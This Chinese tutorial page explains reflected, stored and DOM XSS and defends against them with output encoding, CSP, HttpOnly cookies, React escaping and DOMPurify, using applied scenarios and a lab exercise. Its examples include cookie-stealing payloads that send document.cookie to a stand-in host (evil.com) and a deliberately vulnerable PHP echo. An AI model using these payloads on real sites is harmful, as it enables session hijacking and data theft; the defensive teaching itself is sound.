---
title: XSS
description: 反射型、存储型、DOM 型 XSS 以及输出编码、CSP、HttpOnly 等防御。
---

# XSS

## 1. XSS（跨站脚本攻击）

### 1.1 什么是XSS

XSS（Cross-Site Scripting）指攻击者将恶意脚本注入到受信任的网页中执行。

**为什么XSS极其危险？**

```
XSS 能做的事:
  1. 窃取 Cookie/Token      → 劫持用户会话
  2. 读取 LocalStorage      → 窃取敏感数据
  3. 监听键盘输入           → 窃取密码/信用卡号
  4. 修改DOM               → 伪造登录框钓鱼
  5. 调用Web API           → 以受害者身份操作
  6. 蠕虫传播               → 自动扩散到其他用户
```

### 1.2 XSS分类

| 类型 | 特点 | 数据流向 | 危害程度 |
|------|------|---------|---------|
| 存储型 XSS | 恶意代码永久保存在服务器 | 用户输入 → 服务器存储 → 其他用户访问时执行 | 危害最大 |
| 反射型 XSS | URL 参数中携带恶意脚本 | 服务器直接拼接 URL 参数返回 | 危害较小 |
| DOM 型 XSS | 前端 JS 从 URL/DOM 读取恶意代码 | 不经过服务器，前端 JS 直接解析 | 危害较小 |

**典型场景：**
- 存储型：评论/帖子等用户生成内容
- 反射型：搜索结果页面（URL 参数直接显示）
- DOM 型：前端从 location.hash 读取内容

**反射型XSS示例：**

```php
<!-- 服务器直接将URL参数输出到HTML -->
<p>搜索结果: <?php echo $_GET['q']; ?></p>

<!-- 攻击URL -->
https://site.com/search?q=<script>fetch('https://evil.com/steal?c='+document.cookie)</script>

<!-- 服务器返回 -->
<p>搜索结果: <script>fetch('https://evil.com/steal?c='+document.cookie)</script></p>
```

**存储型XSS示例：**

```javascript
// 攻击者在评论区发表:
用户名: hacker
评论内容: <img src=x onerror="fetch('https://evil.com/steal?c='+document.cookie)">

// 该评论存入数据库,所有访问该页面的用户都会执行恶意脚本
```

**DOM型XSS示例：**

```javascript
// 前端JS直接读取URL hash并写入页面
const hash = location.hash;  // #<img src=x onerror=alert(1)>
document.getElementById('output').innerHTML = decodeURIComponent(hash.substring(1));
// 无需服务器参与,纯前端即可触发
```

### 1.3 存储型/反射型/DOM型XSS区别

```
攻击流程对比:

存储型XSS:
  攻击者 → 提交恶意脚本 → 服务器(持久化) → 其他用户访问 → 脚本执行
           ↓数据库
        [恶意脚本永久保存]

反射型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 服务器解析参数 → 脚本执行
           URL参数       (拼接进响应)    (不持久化)

DOM型XSS:
  攻击者 → 构造恶意URL → 受害者点击URL → 前端JS解析 → 直接修改DOM
           URL/hash      (纯前端处理)    (无需服务器参与)
```

**核心区别：**

| 维度       | 存储型           | 反射型           | DOM型           |
|-----------|-----------------|-----------------|----------------|
| 恶意代码位置 | 服务器数据库     | URL参数          | 前端JS/DOM      |
| 是否持久   | 永久             | 不持久           | 不持久          |
| 触发方式   | 访问页面          | 点击特殊URL      | 修改URL hash    |
| 服务器参与 | 是               | 是               | 否(纯前端)      |

## 2. XSS防御

### 2.1 通用防御措施

**1. 输入过滤与输出编码**

```javascript
// 输出编码函数
function escapeHtml(str) {
  return str
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#x27;');
}

// 在输出到HTML时使用
element.textContent = userInput;        // 安全: 不会执行HTML
element.setAttribute('title', userInput); // 安全
// element.innerHTML = userInput;       // 危险: 可能含恶意脚本
```

**2. CSP (Content Security Policy)**

CSP通过HTTP响应头指示浏览器只允许加载特定来源的资源，从根本上禁止内联脚本执行：

```nginx
# Nginx配置
add_header Content-Security-Policy "
  default-src 'self';
  script-src 'self' 'nonce-{random}';
  style-src 'self' 'nonce-{random}';
  img-src 'self' https: data:;
  connect-src 'self' https://api.example.com;
  frame-ancestors 'none';
" always;
```

```
CSP指令说明:
  default-src 'self'           → 默认只允许同源资源
  script-src 'self'            → JS只允许同源
  script-src 'nonce-abc123'    → 只允许带此nonce的内联脚本
  script-src 'unsafe-inline'   → 允许内联脚本 (不推荐!)
  script-src 'unsafe-eval'     → 允许eval() (不推荐!)
  frame-ancestors 'none'       → 禁止被iframe嵌入
  img-src data:                → 允许data:URI图片
```

**CSP为什么能防XSS？**

```
传统XSS攻击流程:
  攻击者注入: <script src="https://evil.com/xss.js"></script>

CSP生效后:
  script-src 'self'             → 拒绝加载evil.com的脚本
  'nonce-xxx' 要求脚本必须有正确nonce → 内联脚本被阻止

即使攻击者注入 <script>alert(1)</script>:
  → 无效,因为CSP禁止unsafe-inline
  → 即使能注入,也无法执行
```

**3. HttpOnly Cookie**

```http
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

```
HttpOnly标志的作用:
  √ JS无法通过 document.cookie 读取该cookie
  √ XSS脚本无法窃取sessionId
  × 但攻击者仍可通过XSS发起CSRF请求(自动携带cookie)

HttpOnly不能防止XSS:
  → 攻击者虽然拿不到cookie,但可以:
    - 读取页面内容(绕过CSRF token可见性)
    - 发起AJAX请求(请求仍会自动携带cookie)
    - 修改页面DOM(钓鱼攻击)
    - 触发其他恶意行为
```

### 2.2 React的安全机制

**React为什么相对安全？**

```jsx
// React默认会对所有插入的内容进行转义
function SafeComponent({ userInput }) {
  return <div>{userInput}</div>;
  // <div>&lt;script&gt;alert(1)&lt;/script&gt;</div>
  // 渲染为文本,不会执行为JS
}

// 但使用 innerHTML 就会绕过React的转义:
function DangerousComponent({ userInput }) {
  return <div dangerouslySetInnerHTML={{ __html: userInput }} />;
  // 如果userInput含<script>,会执行!
}
```

**dangerouslySetInnerHTML的危险：**

```jsx
// 危险示例 - 攻击者控制的内容
function Comment({ content }) {
  // content来自用户输入,可能含恶意脚本
  return <div dangerouslySetInnerHTML={{ __html: content }} />;
}

// 即使内容看起来安全,也可能被绕过:
const maliciousContent = `<img src="x" onerror="
  fetch('https://evil.com?data='+document.cookie)
" />`;
```

**DOMPurify原理：**

```javascript
// DOMPurify使用浏览器原生DOM解析器,安全净化HTML
import DOMPurify from 'dompurify';

// 净化HTML,移除危险内容
const clean = DOMPurify.sanitize(dangerousHtml, {
  ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'p', 'br'],  // 只允许安全标签
  ALLOWED_ATTR: ['class'],                                // 只允许安全属性
  FORBID_TAGS: ['script', 'iframe', 'object', 'embed'],   // 禁止危险标签
  FORBID_ATTR: ['onerror', 'onload', 'onclick', 'onmouseover'], // 禁止事件属性
});

// 净化过程:
const dirty = '<p>Hello</p><script>alert(1)</script><img src=x onerror=alert(1)>';
// → '<p>Hello</p><img src="x">'
```

DOMPurify的核心原理：
1. 使用浏览器的`DOMParser`将HTML字符串解析为DOM节点树
2. 遍历节点树，只保留白名单中的标签和属性
3. 丢弃所有事件处理器属性（如`onerror`、`onclick`）
4. 对URL属性进行协议白名单检查（禁止`javascript:`）
5. 序列化净化后的DOM为HTML字符串

## 应用与行业实践

前面讲的是注入怎么发生、防御怎么做。这一章回答另一个问题：这些知识在真实项目里落到哪一行代码、哪一个接口上。

### 应用场景地图

| 场景 | 用到本页哪个知识点 | 典型技术选型 | 注意事项 |
| --- | --- | --- | --- |
| 后台管理的万行表格，每行渲染用户昵称、备注、标签 | 输出编码、DOM 型注入点 | 前端框架的文本插值、虚拟滚动 | 关掉列的 `innerHTML` 渲染；筛选条件回填输入框时按属性上下文处理 |
| 低端安卓机上的首屏评论列表 | 输出编码、CSP | 服务端渲染加水合、`textContent` 写入 | 首屏 HTML 在服务端拼好，转义要在拼接处完成，别指望前端补做 |
| 多人协作白板里的贴纸文本与光标昵称 | DOM 型 XSS、WebSocket 消息校验 | WebSocket、Canvas 与 DOM 混合渲染 | 发送端接收端都要校验；房间里会长期存在旧版客户端 |
| 站内搜索关键词回显到结果页标题和空结果提示 | 反射型 XSS、文本与 URL 两种上下文 | 服务端模板、前端路由 query 解析 | 同一个词会出现在 `<title>` 和面包屑两处，上下文不同处理也不同 |
| 运营后台的邮件模板预览 | 存储型 XSS、富文本净化 | 白名单净化器、沙箱 iframe | 预览页与真实发送链路共用同一份净化规则 |
| 第三方客服 SDK 注入的聊天浮窗 | 第三方脚本信任边界、CSP | CSP 脚本源白名单、SRI | 引入方要在 CSP 放行脚本源，同时限制它能往哪里发数据 |
| 用户上传 SVG 当头像或团队图标 | SVG 内的脚本与事件属性、独立源托管 | 服务端转位图、独立域名加 CSP | 内联进 DOM 的 SVG 会执行脚本，用 `<img>` 引用的行为不同 |
| 分享到社交平台的 OG 卡片 | 属性上下文编码 | 服务端渲染 meta 标签 | `og:title` 在 content 属性里，要按属性上下文编码并保留引号 |

### 三个场景拆解

#### 场景 1：后台管理的万行表格

**业务背景**：客服后台要把用户列表铺在浏览器里，滚动到上万行，昵称、备注、标签都由用户自己填。行数随注册量线性增长，可以在测试环境用脚本插入一万行来复现真实压力。

**怎么用本页知识解决**：思路是让后端只返回 JSON 字段，前端一律用文本节点写入单元格，富文本列走单独的白名单净化接口。

```js
// 数据来自接口返回的 JSON，响应体里不含 HTML 片段
const cell = document.createElement('td');
// 文本上下文：用 textContent，尖括号只会作为字符显示
cell.textContent = user.nickname ?? '';
const link = document.createElement('a');
// URL 上下文：参数位置做一次编码，防止被塞进 javascript: 协议
link.href = '/user/' + encodeURIComponent(user.id);
// 属性上下文：整串赋值，引号由浏览器补，不手工拼字符串
link.title = user.nickname ?? '';
link.textContent = user.nickname ?? '';
// 节点最后统一挂到行上，全程不碰 innerHTML
row.append(cell, link);
```

- 把昵称交给 `textContent`，`<img src=x onerror=...>` 只显示成文字，不会生成节点。
- `href` 走 `encodeURIComponent`，参数位被替换成合法字符序列，协议头没法被改写。
- `title` 用属性赋值写入，省掉手工加引号这一步，也就没有闭合逃逸的位置。
- 页面外壳 HTML 写死在模板里，不用 `innerHTML` 拼装，CSP 就能收紧到不含 `unsafe-inline`。
- 富文本列必须走独立的净化接口，返回受限标签集合，插入前再做一次白名单校验。

**怎么度量收益**：

- 指标：OWASP ZAP 主动扫描报告里 `Cross Site Scripting` 与 `Persistent XSS` 的告警条数，改造前后用同一套爬取种子对比。
- 指标：滚动十秒的掉帧数，用 Chrome DevTools 的 Performance 面板录制，看 Frames 轨道。
- 指标：CSP 违规上报条数，配置 `report-to` 后观察线上真实注入尝试是否被拦下。
- 方法：用 Playwright 写入带 `onerror` 的昵称，监听 `dialog` 事件，断言全程无弹窗。

**什么时候不该用**：

- 表格要展示运营配置的加粗、链接、@提及，纯文本会丢掉格式，这时应在服务端净化后返回受限 HTML。
- 在 Node 端拼邮件正文或导出 PDF，没有 DOM 可用，`textContent` 方案不成立，要在模板层做 HTML 转义。

#### 场景 2：多人协作白板

**业务背景**：白板允许外部访客通过分享链接加入，贴纸文本由远端浏览器推给所有参与者。拖动贴纸时消息频率明显升高，可以用测试脚本按固定频率注入消息来复现高峰。

**怎么用本页知识解决**：思路是按字段类型校验 WebSocket 消息，文本字段进 `textContent`，坐标这类数字字段先转成 `Number` 再拼进样式。

```js
// 消息来自 WebSocket，发送方可能是被控客户端
function onRemoteSticker(msg, layer) {
  if (typeof msg.text !== 'string') return;      // 类型不符直接丢弃
  const el = document.createElement('div');
  el.className = 'sticker';
  el.textContent = msg.text;                     // 贴纸文本走 textContent
  const x = Number(msg.x), y = Number(msg.y);    // 坐标转成数字类型
  if (!Number.isFinite(x) || !Number.isFinite(y)) return; // 非数字就退出
  el.style.transform = `translate(${x}px, ${y}px)`; // 数值拼进样式，没有引号可闭合
  layer.appendChild(el);
}
```

- 类型判断放在最前面，非字符串的载荷不会进入后续渲染路径。
- 贴纸文本用 `textContent`，`<script>` 标签会原样显示成字符。
- 坐标先过 `Number()`，`0;background:url(...)` 这类字符串转换后是 `NaN`，被有限性检查拦下。
- 样式由数值拼成，不存在引号闭合后另起一条声明的可能。
- 服务端也要做同一套校验，因为房间里会长期存在没升级的旧客户端。

**怎么度量收益**：

- 指标：用 Playwright 发送带 `<img src=x onerror=...>` 的贴纸文本，断言 layer 下 `img` 节点数为 0。
- 指标：CSP 的 `report-to` 上报条数，按拦截指令分类统计。
- 指标：单条消息处理耗时，用 `performance.now()` 包裹函数后取 P95。
- 方法：OWASP ZAP 的 WebSocket 标签页可以记录并重放握手与消息帧，用来做回归。

**什么时候不该用**：

- 贴纸要支持 @提及、代码块、内联链接，纯文本渲染不出这些结构，需要在客户端跑白名单净化。
- 贴纸要点击跳转到外部站点，`href` 必须做协议白名单，只放行 `http` 与 `https`，不能直接赋任意字符串。

#### 场景 3：用户上传 SVG 头像

**业务背景**：用户可以上传头像，设计师要求支持矢量图，方便在高分屏上显示。SVG 可以携带 `<script>` 与事件属性，一旦被内联进 DOM 就会执行。一个头像文件会同时出现在个人页、评论区、@提及列表。

**怎么用本页知识解决**：思路是上传入口只收位图格式，SVG 走服务端转位图的单独通道，展示时按固定路径引用，用户内容放到独立源上。

```js
const BITMAP = new Set(['image/png', 'image/jpeg', 'image/webp']); // 位图白名单
function checkUpload(file) {
  // 先看请求声明的类型
  if (!BITMAP.has(file.mimetype)) return { ok: false, reason: 'type' };
  if (file.size > MAX_AVATAR_BYTES) return { ok: false, reason: 'size' };
  // 再读文件前几字节做文件头比对（该函数自行实现），防改扩展名绕过
  if (!matchMagicBytes(file.buffer)) return { ok: false, reason: 'magic' };
  return { ok: true };
}
// 展示路径由服务端按 userId 生成，用户文件名不参与拼接
const avatarUrl = '/avatar/' + encodeURIComponent(userId) + '.png';
```

- 白名单只放行位图类型，SVG 不在名单里，从入口切掉脚本载体。
- 文件头比对挡的是改扩展名这类绕过，请求里声明的类型可以被客户端伪造。
- 展示路径由 `userId` 生成，用户提供的文件名不参与拼接，路径穿越和文件名注入都没有位置。
- 页面用 `<img>` 引用头像，配合 CSP 的 `img-src` 限制图片来源。
- 确实要矢量图时改为服务端转 PNG，或放到独立域名托管，不要内联进主文档。

**怎么度量收益**：

- 指标：CSP 违规上报里 `script-src` 与 `img-src` 的拦截条数。
- 指标：上传接口的拒绝比例，按 `reason` 分类，`type` 与 `magic` 的差值高说明存在改扩展名的尝试。
- 方法：用 Playwright 上传带 `<script>alert(1)</script>` 的 SVG，监听 `dialog` 事件，断言全程无弹窗。
- 方法：用 OWASP ZAP 对上传接口做主动扫描，对比改造前后的告警条数。

**什么时候不该用**：

- 产品要求矢量头像任意缩放不失真，转位图会丢掉这个特性，此时应改为独立源托管 SVG，用 `<img>` 引用并由 CSP 限制该源。
- 头像来自企业 SSO 且由管理员维护、不接受用户上传，增加转换链路带来的延迟与存储开销换不到对应收益。

### 行业先进实践

**Trusted Types 强制 DOM 赋值走类型检查（出处：W3C Trusted Types 规范 / MDN Web Docs）**
做法是把 `innerHTML`、`script.src` 这类注入汇点改成只接受 `TrustedHTML` 等包装类型，普通字符串会被浏览器拒绝。有效的原因是错误在赋值那一刻就抛出来，而不是等到上线后被人发现。借鉴方式是在新项目上先用 CSP 的 `require-trusted-types-for 'script'` 做上报模式，收集违规点再逐个改造。需核对官方文档：MDN 浏览器兼容表，确认目标用户群的浏览器覆盖情况。

**CSP 的 nonce 配合 strict-dynamic（出处：MDN Web Docs 的 Content-Security-Policy 页面 / web.dev）**
做法是每次响应生成随机 nonce，只放行带该 nonce 的脚本，其余脚本源一律忽略。有效的原因是攻击者即使插入 `<script>` 标签，也无法预测本次响应的 nonce。借鉴方式是先让模板引擎输出 nonce，再用 `report-to` 观察几天误报，然后切到拦截模式。

**DOMPurify 做富文本白名单净化（出处：开源项目 DOMPurify，由 cure53 维护）**
做法是把待渲染的 HTML 交给净化器，只保留配置里列出的标签、属性与协议。有效的原因是采用白名单而非黑名单，新出现的标签不会自动获得通行。借鉴方式是在服务端和客户端各调用一次，服务端那次用同一份配置，避免预览干净、发送带毒。

**React 的默认转义与 `dangerouslySetInnerHTML` 唯一逃逸口（出处：React 官方文档）**
JSX 里作为子节点插入的字符串会被自动转义，绕过路径集中在 `dangerouslySetInnerHTML` 和直接操作 DOM 的代码上。有效的原因是默认安全，风险点收敛成可枚举的清单。借鉴方式是在代码评审规则里把 `dangerouslySetInnerHTML` 和 `ref` 上的 DOM 操作列为必审项。

**OWASP XSS Prevention Cheat Sheet 的按上下文编码规则（出处：OWASP Cheat Sheet Series）**
做法是按输出位置区分编码方式：HTML 正文、属性值、URL 参数、JavaScript 字符串各有对应规则。有效的原因是同一个字符在不同上下文里的危险程度不同，统一编码解决不了全部位置。借鉴方式是把这份规则表固化成模板引擎的自动转义策略和编码函数库。

### 从学到用：落地路线

**第 1 步：在一个入口试点。** 选一个用户输入直接回显的页面，比如站内搜索页，只改这一条链路的输出编码。验收标准：该页面在 ZAP 主动扫描下 `Cross Site Scripting` 告警数为 0。

**第 2 步：用自动化用例验证。** 给这条链路写 Playwright 用例，输入带事件属性的载荷，监听 `dialog` 事件并断言无弹窗。验收标准：用例在 CI 里稳定通过，且能被评审者本地复现。

**第 3 步：推广到同类入口。** 把编码函数与评审清单扩散到评论、昵称、模板预览等同构页面。验收标准：这些页面的模板里搜不到 `innerHTML` 直接拼接用户字段。

**第 4 步：防止回退。** 在 CI 里加入静态检查与 CSP 上报看板，新出现的违规点自动开单。验收标准：CSP 违规上报在发布后一周内没有新增未处理条目。

### 动手作业

**目标**：做一个带评论区的迷你留言板，把存储型 XSS 从复现到修好走完整条链路。

**步骤**：

1. 用任意服务端语言写两个接口：提交评论、读取评论列表，数据先存内存。
2. 第一版渲染故意用字符串拼接 HTML，插入 `<img src=x onerror=alert(1)>`，录屏确认弹窗。
3. 改成前端拿到 JSON 后用 `textContent` 写入，再插入同一段载荷，确认只显示为文字。
4. 增加一个"支持加粗和链接"的富文本开关，改用白名单净化后再插入。
5. 配置 CSP，用 nonce 放行自己的脚本，用 `report-to` 收集违规上报。
6. 写 Playwright 用例：提交载荷、监听 `dialog` 事件、断言无弹窗且页面出现该段文字。
7. 把用例接入 CI，并在 README 里记录复现命令与扫描结果。

**验收标准**：

- 用 `<img src=x onerror=alert(1)>` 输入后，页面显示这段文字本身，没有弹窗，也没有生成 `img` 节点。
- 富文本开关打开后，只保留配置里列出的标签，`script`、`iframe`、事件属性都被去掉。
- CSP 生效后，DevTools 的 Console 里能看到由本页策略产生的违规上报记录。
- CI 里的 Playwright 用例在不手工干预的情况下通过。
- README 里的复现命令由另一位同学照着执行一遍，能得到一致结果。

